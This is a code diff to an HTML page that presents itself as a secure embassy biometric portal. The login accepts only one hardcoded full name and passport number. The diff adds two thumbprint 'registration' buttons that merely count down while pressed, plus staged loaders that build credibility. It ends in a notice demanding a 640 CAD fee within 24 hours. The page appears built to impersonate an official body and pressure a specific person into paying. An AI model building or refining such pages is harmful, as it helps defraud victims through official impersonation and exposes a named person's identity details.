@@ -13,6 +13,10 @@
             box-sizing: border-box;
         }
         
+        *, *:before, *:after {
+            box-sizing: border-box;
+        }
+        
         :root {
             --primary: #8ABCFF;
             --accent: #FF8A8A;
@@ -42,11 +46,13 @@
             justify-content: center;
             padding: 20px;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 18px;
+            line-height: 1.6;
         }
         
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 550px;
             background: white;
             border-radius: 16px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
@@ -290,9 +296,24 @@
             display: none;
         }
         
-        .fingerprint-container {
+        /* Updated fingerprint container for two fingerprints */
+        .fingerprints-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        
+        .fingerprint-section {
+            flex: 1;
             text-align: center;
-            padding: 20px 0;
+        }
+        
+        .fingerprint-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--dark);
+            font-size: 1.1rem;
         }
         
         .fingerprint-icon {
@@ -303,7 +324,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
+            margin: 0 auto 10px;
             cursor: pointer;
             position: relative;
             transition: all 0.3s ease;
@@ -346,6 +367,7 @@
             font-size: 1rem;
             color: #666;
             line-height: 1.5;
+            text-align: center;
         }
         
         .countdown {
@@ -376,7 +398,7 @@
         /* Enhanced Footer Styles */
         .footer {
             width: 100%;
-            max-width: 500px;
+            max-width: 550px;
             background: white;
             border-radius: 16px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
@@ -599,6 +621,115 @@
             margin-right: 8px;
         }
         
+        /* Loader Styles */
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        
+        .loader-container.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .loader {
+            position: relative;
+            width: 50px;
+            height: 10px;
+            background: #3498DB;
+            border-radius: 5px;
+            animation: load 1.8s ease-in-out infinite; 
+        }
+        
+        .loader:before, .loader:after {
+            position: absolute; 
+            display: block;
+            content: "";
+            animation: load 1.8s ease-in-out infinite;
+            height: 10px;
+            border-radius: 5px;
+        }
+        
+        .loader:before {
+            top: -20px;
+            left: 10px;
+            width: 40px;
+            background: #EF4836;
+        }
+        
+        .loader:after {
+            bottom: -20px;
+            width: 35px;
+            background: #F5AB35; 
+        }
+        
+        @keyframes load {
+            0% {
+                transform: translateX(40px);
+            }
+            
+            50% {
+                transform: translateX(-30px);
+            }
+            100% {
+                transform: translateX(40px);
+            }
+        }
+        
+        .loader-text {
+            margin-top: 80px;
+            font-size: 1.2rem;
+            color: var(--dark);
+            text-align: center;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+        
+        .initial-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ed 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+        }
+        
+        .initial-loader-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .initial-loader .loader {
+            margin-bottom: 20px;
+        }
+        
+        .initial-loader-text {
+            font-size: 1.2rem;
+            color: var(--dark);
+            text-align: center;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+        
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -705,6 +836,22 @@
             background: rgba(138, 188, 255, 0.1);
         }
         
+        @media (max-width: 600px) {
+            .fingerprints-container {
+                flex-direction: column;
+                gap: 30px;
+            }
+            
+            .fingerprint-icon {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .fingerprint-icon i {
+                font-size: 40px;
+            }
+        }
+        
         @media (max-width: 480px) {
             .container {
                 border-radius: 12px;
@@ -716,15 +863,6 @@
             
             .content {
                 padding: 20px;
-            }
-            
-            .fingerprint-icon {
-                width: 100px;
-                height: 100px;
-            }
-            
-            .fingerprint-icon i {
-                font-size: 40px;
             }
             
             .security-info {
@@ -747,6 +885,11 @@
             .modal-footer {
                 flex-direction: column;
             }
+            
+            .loader-text {
+                margin-top: 60px;
+                font-size: 1rem;
+            }
         }
         
         @media (max-width: 350px) {
@@ -765,6 +908,14 @@
     </style>
 </head>
 <body>
+    <!-- Initial Loader -->
+    <div class="initial-loader" id="initial-loader">
+        <div class="initial-loader-content">
+            <div class="loader"></div>
+            <div class="initial-loader-text">Initializing Secure Portal...</div>
+        </div>
+    </div>
+    
     <div class="container">
         <div class="header">
             <div class="header-content">
@@ -878,22 +1029,33 @@
                 <div class="section-title">Biometric Registration Process</div>
                 
                 <div class="instructions">
-                    <p>Please register your fingerprint using the interface below. This process typically takes 5 seconds and is required for secure access to embassy services.</p>
+                    <p>Please register both of your thumb fingerprints using the interfaces below. Each registration typically takes 5 seconds and is required for secure access to embassy services.</p>
                 </div>
                 
-                <div class="fingerprint-container">
-                    <div class="fingerprint-icon" id="fingerprint-btn">
-                        <i class="fas fa-fingerprint"></i>
+                <!-- Two fingerprint sections -->
+                <div class="fingerprints-container">
+                    <div class="fingerprint-section">
+                        <div class="fingerprint-title">Left Thumb Fingerprint</div>
+                        <div class="fingerprint-icon" id="left-fingerprint-btn">
+                            <i class="fas fa-fingerprint"></i>
+                        </div>
+                        <div class="countdown" id="left-countdown">5</div>
+                        <p class="instructions">Press and hold for 5 seconds</p>
                     </div>
                     
-                    <div class="countdown" id="countdown">5</div>
-                    
-                    <p class="instructions">Press and hold the fingerprint icon for 5 seconds to complete registration</p>
+                    <div class="fingerprint-section">
+                        <div class="fingerprint-title">Right Thumb Fingerprint</div>
+                        <div class="fingerprint-icon" id="right-fingerprint-btn">
+                            <i class="fas fa-fingerprint"></i>
+                        </div>
+                        <div class="countdown" id="right-countdown">5</div>
+                        <p class="instructions">Press and hold for 5 seconds</p>
+                    </div>
                 </div>
                 
                 <div class="success-message" id="success-message">
                     <i class="fas fa-check-circle"></i>
-                    <p>Fingerprint successfully registered. Your biometric data has been securely stored.</p>
+                    <p>Fingerprints successfully registered. Your biometric data has been securely stored.</p>
                 </div>
                 
                 <div class="privacy-notice">
@@ -964,39 +1126,67 @@
         </div>
     </div>
     
-    <!-- Payment Modal -->
-    <div class="modal-overlay" id="payment-modal">
-        <div class="payment-modal">
-            <div class="modal-header">
-                <i class="fas fa-exclamation-triangle"></i>
-                <h3>Important Payment Notice</h3>
-            </div>
-            <div class="modal-content">
-                <p>A processing fee is required to complete your biometric registration. Please ensure payment is made within 24 hours to avoid delays in your application processing.</p>
-                
-<div class="payment-amount">
-  <span class="amount" style="color: darkgreen; font-weight: bold;">640</span>
-  <span class="currency" style="color: darkgreen; font-weight: normal;">CAD (Canadian Dollar)</span>
-</div>
-
-                
-                <p>Payment can be made through our secure payment portal. You will receive an email with payment instructions shortly.</p>
-            </div>
-            <div class="modal-footer">
-                <button class="btn" id="close-modal">Close</button>
-            </div>
+    <!-- Loader Container -->
+    <div class="loader-container" id="loader-container">
+        <div class="loader"></div>
+        <div class="loader-text">
+            Processing your biometric data and preparing secure payment portal...
         </div>
     </div>
+    
+<!-- Payment Modal -->
+<div class="modal-overlay" id="payment-modal" 
+     style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.5); display: flex; 
+            justify-content: center; align-items: center; z-index: 9999;">
+    
+  <div class="payment-modal" 
+       style="background: #fffde7; /* very light yellow */
+              padding: 20px; border-radius: 12px; 
+              max-width: 500px; width: 90%;
+              box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
+    
+    <div class="modal-header" style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+      <i class="fas fa-exclamation-triangle" style="color: darkorange;"></i>
+      <h3 style="margin: 0; font-size: 1.4em; color: #333;">Important Payment Notice</h3>
+    </div>
+    
+    <div class="modal-content" style="font-size: 1em; color: #444; line-height: 1.5;">
+      <p>A processing fee is required to complete your biometric registration. Please ensure payment is made within 24 hours to avoid delays in your application processing.</p>
+      
+      <div class="payment-amount" style="margin: 15px 0; text-align: center;">
+        <span class="amount" style="color: darkgreen; font-weight: bold; font-size: 1.4em;">640</span>
+        <span class="currency" style="color: darkgreen; font-weight: normal; font-size: 1em; margin-left: 6px;">
+          CAD (Canadian Dollar)
+        </span>
+      </div>
+      
+      <p>Payment can be made through our secure payment portal. You will receive an email with payment instructions shortly.</p>
+    </div>
+    
+    <div class="modal-footer" style="text-align: right; margin-top: 20px;">
+      <button class="btn" id="close-modal" 
+              style="background: darkgreen; color: white; padding: 8px 16px;
+                     border: none; border-radius: 6px; cursor: pointer;">
+        Close
+      </button>
+    </div>
+  </div>
+</div>
+
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // DOM Elements
+            const initialLoader = document.getElementById('initial-loader');
             const loginPage = document.getElementById('login-page');
             const fingerprintPage = document.getElementById('fingerprint-page');
             const loginBtn = document.getElementById('login-btn');
             const backBtn = document.getElementById('back-btn');
-            const fingerprintBtn = document.getElementById('fingerprint-btn');
-            const countdown = document.getElementById('countdown');
+            const leftFingerprintBtn = document.getElementById('left-fingerprint-btn');
+            const rightFingerprintBtn = document.getElementById('right-fingerprint-btn');
+            const leftCountdown = document.getElementById('left-countdown');
+            const rightCountdown = document.getElementById('right-countdown');
             const successMessage = document.getElementById('success-message');
             const paymentModal = document.getElementById('payment-modal');
             const closeModalBtn = document.getElementById('close-modal');
@@ -1005,10 +1195,20 @@
             const passportInput = document.getElementById('passport');
             const usernameError = document.getElementById('username-error');
             const passportError = document.getElementById('passport-error');
+            const loaderContainer = document.getElementById('loader-container');
             
             // Valid credentials
             const validUsername = "Alemayehu Gebrewold Hailu";
             const validPassport = "EQ2560260";
+            
+            // Track fingerprint registration status
+            let leftFingerprintRegistered = false;
+            let rightFingerprintRegistered = false;
+            
+            // Show initial loader for 10 seconds when page loads
+            setTimeout(function() {
+                initialLoader.style.display = 'none';
+            }, 10000); // 10 seconds
             
             // Login functionality
             loginBtn.addEventListener('click', function() {
@@ -1051,66 +1251,116 @@
                 loginPage.classList.add('active');
                 
                 // Reset fingerprint page
-                fingerprintBtn.classList.remove('active', 'success');
-                countdown.style.display = 'none';
+                leftFingerprintBtn.classList.remove('active', 'success');
+                rightFingerprintBtn.classList.remove('active', 'success');
+                leftCountdown.style.display = 'none';
+                rightCountdown.style.display = 'none';
                 successMessage.style.display = 'none';
-                countdown.textContent = '5';
+                leftCountdown.textContent = '5';
+                rightCountdown.textContent = '5';
+                leftFingerprintRegistered = false;
+                rightFingerprintRegistered = false;
             });
             
             // Fingerprint registration functionality
-            let holdTimer;
-            let countdownValue = 5;
+            let leftHoldTimer, rightHoldTimer;
+            let leftCountdownValue = 5, rightCountdownValue = 5;
             
-            // For mouse events (desktop)
-            fingerprintBtn.addEventListener('mousedown', startHold);
-            fingerprintBtn.addEventListener('mouseup', cancelHold);
-            fingerprintBtn.addEventListener('mouseleave', cancelHold);
+            // Setup event listeners for both fingerprint buttons
+            setupFingerprintButton(leftFingerprintBtn, leftCountdown, 'left');
+            setupFingerprintButton(rightFingerprintBtn, rightCountdown, 'right');
             
-            // For touch events (mobile)
-            fingerprintBtn.addEventListener('touchstart', startHold);
-            fingerprintBtn.addEventListener('touchend', cancelHold);
-            fingerprintBtn.addEventListener('touchcancel', cancelHold);
+            function setupFingerprintButton(button, countdown, side) {
+                // For mouse events (desktop)
+                button.addEventListener('mousedown', (e) => startHold(e, button, countdown, side));
+                button.addEventListener('mouseup', () => cancelHold(button, countdown, side));
+                button.addEventListener('mouseleave', () => cancelHold(button, countdown, side));
+                
+                // For touch events (mobile)
+                button.addEventListener('touchstart', (e) => startHold(e, button, countdown, side));
+                button.addEventListener('touchend', () => cancelHold(button, countdown, side));
+                button.addEventListener('touchcancel', () => cancelHold(button, countdown, side));
+            }
             
-            function startHold(e) {
+            function startHold(e, button, countdown, side) {
                 e.preventDefault(); // Prevent default behavior
                 
                 // Reset state
-                fingerprintBtn.classList.remove('success');
-                successMessage.style.display = 'none';
+                button.classList.remove('success');
                 countdownValue = 5;
                 countdown.textContent = countdownValue;
                 
                 // Start the hold
-                fingerprintBtn.classList.add('active');
+                button.classList.add('active');
                 countdown.style.display = 'block';
                 
                 // Start countdown
-                holdTimer = setInterval(function() {
+                const holdTimer = setInterval(function() {
                     countdownValue--;
                     countdown.textContent = countdownValue;
                     
                     if (countdownValue <= 0) {
                         // Success - fingerprint registered
                         clearInterval(holdTimer);
-                        fingerprintBtn.classList.remove('active');
-                        fingerprintBtn.classList.add('success');
+                        button.classList.remove('active');
+                        button.classList.add('success');
                         countdown.style.display = 'none';
-                        successMessage.style.display = 'block';
                         
-                        // Show payment modal after a short delay
-                        setTimeout(function() {
-                            paymentModal.classList.add('active');
-                        }, 800);
+                        // Mark this fingerprint as registered
+                        if (side === 'left') {
+                            leftFingerprintRegistered = true;
+                        } else {
+                            rightFingerprintRegistered = true;
+                        }
+                        
+                        // Check if both fingerprints are registered
+                        checkBothFingerprintsRegistered();
                     }
                 }, 1000);
+                
+                // Store the timer reference
+                if (side === 'left') {
+                    leftHoldTimer = holdTimer;
+                } else {
+                    rightHoldTimer = holdTimer;
+                }
             }
             
-            function cancelHold() {
-                clearInterval(holdTimer);
-                fingerprintBtn.classList.remove('active');
+            function cancelHold(button, countdown, side) {
+                if (side === 'left') {
+                    clearInterval(leftHoldTimer);
+                } else {
+                    clearInterval(rightHoldTimer);
+                }
+                
+                button.classList.remove('active');
                 countdown.style.display = 'none';
-                countdownValue = 5;
-                countdown.textContent = countdownValue;
+                
+                if (side === 'left') {
+                    leftCountdownValue = 5;
+                } else {
+                    rightCountdownValue = 5;
+                }
+                
+                countdown.textContent = '5';
+            }
+            
+            function checkBothFingerprintsRegistered() {
+                if (leftFingerprintRegistered && rightFingerprintRegistered) {
+                    // Show success message
+                    successMessage.style.display = 'block';
+                    
+                    // Show loader after a short delay
+                    setTimeout(function() {
+                        loaderContainer.classList.add('active');
+                        
+                        // After 30 seconds, show payment modal
+                        setTimeout(function() {
+                            loaderContainer.classList.remove('active');
+                            paymentModal.classList.add('active');
+                        }, 30000); // 30 seconds
+                    }, 1500);
+                }
             }
             
             // Modal functionality
